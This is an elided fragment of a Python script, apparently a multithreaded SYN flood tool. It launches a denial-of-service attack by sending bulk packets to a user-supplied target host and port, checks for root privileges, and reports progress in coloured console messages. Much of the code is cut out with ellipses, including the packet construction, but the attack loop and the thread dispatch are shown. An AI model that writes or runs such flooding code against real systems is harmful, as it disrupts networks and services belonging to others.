...
def syn_flood(thread_index, target, port, size, count):
	...
	display('+', f"{Back.LIGHTBLUE_EX}{thread_index}{Back.RESET} -> Done")
	display('+', f"{Back.LIGHTBLUE_EX}{thread_index}{Back.RESET} -> Flooding {Back.MAGENTA}{count}{Back.RESET} Packets to target {Back.MAGENTA}{target}{Back.RESET}:{Back.MAGENTA}{port}{Back.RESET}")
	send(packet * count, verbose=0)
...
if __name__ == "__main__":
	...
	if not data.count:
		...
		try:
			...
			display('-', "Please enter a valid packet count")
			exit(0)
	if not check_root():
	...
	threads = []
	display('+', f"Starting SYN Flood Attack on {Back.MAGENTA}{data.target}{Back.RESET}:{Back.MAGENTA}{data.port}{Back.RESET} with {Back.MAGENTA}{thread_count}{Back.RESET} threads and {Back.MAGENTA}{data.count}{Back.RESET} packets per thread")
	for thread_index in range(thread_count):
		threads.append(pool.apply_async(syn_flood, (thread_index, data.target, data.port, data.size, data.count)))
	try:
